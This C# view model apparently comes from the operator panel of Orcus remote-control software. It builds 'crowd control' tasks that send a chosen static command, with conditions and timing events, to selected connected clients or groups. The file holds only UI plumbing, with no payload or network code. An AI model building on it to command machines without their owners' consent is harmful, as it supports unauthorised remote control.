using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using Orcus.Administration.Core;
using Orcus.Administration.Core.ClientManagement;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.DynamicCommands;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels
{
    public class CrowdControlCreateTaskViewModel : PropertyChangedBase
    {
        private readonly ConnectionManager _connectionManager;
        private readonly List<ClientViewModel> _initialClientViewModels;
        private readonly string _titlePrefix;
        private RelayCommand _addConditionCommand;
        private RelayCommand _cancelCommand;
        private string _customName;
        private bool? _dialogResult;
        private RelayCommand _editConditionCommand;
        private bool _isSelectedCommandTypeActive;
        private RelayCommand _removeConditionCommand;
        private StaticCommand _selectedCommand;
        private Condition _selectedCondition;
        private string _title;

        public CrowdControlCreateTaskViewModel(ConnectionManager connectionManager, string title,
            CreationMode creationModes)
        {
            _titlePrefix = title;
            _connectionManager = connectionManager;
            Conditions = new ObservableCollection<Condition>();

            if ((creationModes & CreationMode.NoTarget) == CreationMode.NoTarget)
                NoTarget = true;

            if ((creationModes & CreationMode.WithName) == CreationMode.WithName)
                RequestName = true;
        }

        public CrowdControlCreateTaskViewModel(ConnectionManager connectionManager,
            IEnumerable<ClientViewModel> clientViewModels, string title)
            : this(connectionManager, title, CreationMode.NoTarget)
        {
            _initialClientViewModels = clientViewModels.ToList();
        }

        public Action<List<ClientViewModel>> SelectClientViewModels { get; set; }

        public bool NoTarget { get; }
        public bool RequestName { get; }

        public CommandTarget CommandTarget { get; private set; }
        public TransmissionEvent TransmissionEvent { get; private set; }
        public ExecutionEvent ExecutionEvent { get; private set; }
        public StopEvent StopEvent { get; private set; }

        public ObservableCollection<ClientViewModel> Clients => _connectionManager.ClientProvider.Clients;
        public ObservableCollection<string> Groups => _connectionManager.ClientProvider.Groups;

        public StaticCommand SelectedCommand
        {
            get { return _selectedCommand; }
            set
            {
                if (SetProperty(value, ref _selectedCommand))
                {
                    Title = value == null ? _titlePrefix : $"{_titlePrefix} - {value.Name}";
                    IsSelectedCommandTypeActive = value is ActiveStaticCommand;
                }
            }
        }

        public ObservableCollection<Condition> Conditions { get; }

        public bool IsSelectedCommandTypeActive
        {
            get { return _isSelectedCommandTypeActive; }
            set { SetProperty(value, ref _isSelectedCommandTypeActive); }
        }

        public Condition SelectedCondition
        {
            get { return _selectedCondition; }
            set { SetProperty(value, ref _selectedCondition); }
        }

        public string Title
        {
            get { return _title ?? _titlePrefix; }
            set { SetProperty(value, ref _title); }
        }

        public string CustomName
        {
            get { return _customName; }
            set { SetProperty(value, ref _customName); }
        }

        public bool? DialogResult
        {
            get { return _dialogResult; }
            set { SetProperty(value, ref _dialogResult); }
        }

        public RelayCommand AddConditionCommand
        {
            get
            {
                return _addConditionCommand ?? (_addConditionCommand = new RelayCommand(parameter =>
                {
                    var addConditionViewModel = new AddConditionViewModel();
                    if (WindowServiceInterface.Current.OpenWindowDialog(addConditionViewModel) == true)
                        Conditions.Add(addConditionViewModel.NewCondition);
                }));
            }
        }

        public RelayCommand RemoveConditionCommand
        {
            get
            {
                return _removeConditionCommand ?? (_removeConditionCommand = new RelayCommand(parameter =>
                {
                    var conditions = ((IList) parameter).OfType<Condition>().ToList();
                    foreach (var condition in conditions)
                        Conditions.Remove(condition);
                }));
            }
        }

        public RelayCommand EditConditionCommand
        {
            get
            {
                return _editConditionCommand ?? (_editConditionCommand = new RelayCommand(parameter =>
                {
                    var condition = parameter as Condition;
                    if (condition == null)
                        return;

                    var addConditionViewModel = new AddConditionViewModel(condition);
                    WindowServiceInterface.Current.OpenWindowDialog(addConditionViewModel);
                    //To refresh the condition
                    var index = Conditions.IndexOf(condition);
                    Conditions.Remove(condition);
                    Conditions.Insert(index, condition);
                    SelectedCondition = condition;
                }));
            }
        }

        public RelayCommand CancelCommand
        {
            get
            {
                return _cancelCommand ?? (_cancelCommand = new RelayCommand(parameter => { DialogResult = false; }));
            }
        }

        public void OkButtonClick(CommandTarget commandTarget, TransmissionEvent transmissionEvent,
            ExecutionEvent executionEvent, StopEvent stopEvent)
        {
            CommandTarget = commandTarget;
            TransmissionEvent = transmissionEvent;
            ExecutionEvent = executionEvent;
            StopEvent = stopEvent;

            DialogResult = true;
        }

        public void Loaded()
        {
            if (_initialClientViewModels != null)
                SelectClientViewModels(_initialClientViewModels);
        }
    }

    [Flags]
    public enum CreationMode
    {
        Complete = 0,
        NoTarget = 1 << 0,
        WithName = 1 << 1
    }
}